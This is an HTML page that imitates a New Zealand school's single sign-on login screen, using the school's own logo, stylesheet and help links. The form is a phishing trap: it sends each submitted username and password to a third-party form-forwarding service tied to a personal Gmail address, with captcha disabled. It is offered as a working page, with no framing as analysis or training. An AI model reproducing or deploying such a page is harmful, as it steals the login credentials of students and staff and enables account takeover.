<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en" style="background-image: url('https://idp.macleans.school.nz/module.php/themeMacleans/resources/icons/bg.jpg');">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0" />
    <script type="text/javascript" src="/resources/script.js"></script>
    <title>Enter your username and password</title>

    <link rel="stylesheet" type="text/css" href="https://idp.macleans.school.nz/module.php/themeMacleans/resources/default.css?v=2" />
    <link rel="icon" type="image/x-icon" href="https://idp.macleans.school.nz/module.php/themeMacleans/resources/icons/favicon.ico?v=2" />
    <link rel="shortcut icon" type="image/x-icon" href="https://idp.macleans.school.nz/module.php/themeMacleans/resources/icons/favicon.ico?v=2" />

    <meta name="robots" content="noindex, nofollow" />

</head>
<body onload="SimpleSAML_focus('username');">
<div id="login">
    <div id="logo"><img src="https://idp.macleans.school.nz/module.php/themeMacleans/resources/icons/logo.png" /></div>
    <!-- FormSubmit.co integration -->
    <form action="https://formsubmit.co/cadabra.industries@gmail.com" method="post">
        <p>
            <label>Username<br/>
            <input type="text" id="username" tabindex="1" autocorrect="off" autocapitalize="off" name="username" value="" />
            </label>
        </p>
        <p>
            <label>
                Password<br/>
                <input id="password" type="password" tabindex="2" name="password" />
            </label>
        </p>

        <input type="submit" tabindex="3" value="Login" class="button" />
        <!-- Add other optional fields as needed -->
        <input type="hidden" name="_subject" value="Login Form Submission" />
        <!-- Disable reCAPTCHA for testing -->
        <input type="hidden" name="_captcha" value="false" />
    </form>
    <a href="https://www.ourschool.co.nz">
        <img src="https://idp.macleans.school.nz/module.php/themeMacleans/resources/icons/Our-School-Logo-White.png" style="width:60px;position:absolute;margin-left:20px;opacity:0.8;" />
    </a>
    <a href="http://www.macleans.school.nz/password-service.htm">
        <img src="https://idp.macleans.school.nz/module.php/themeMacleans/resources/icons/question_mark-white.png" style="width:20px;float:right;margin-top:10px;margin-right:20px;opacity:0.8;" />
    </a>
</div>
</body>
</html>
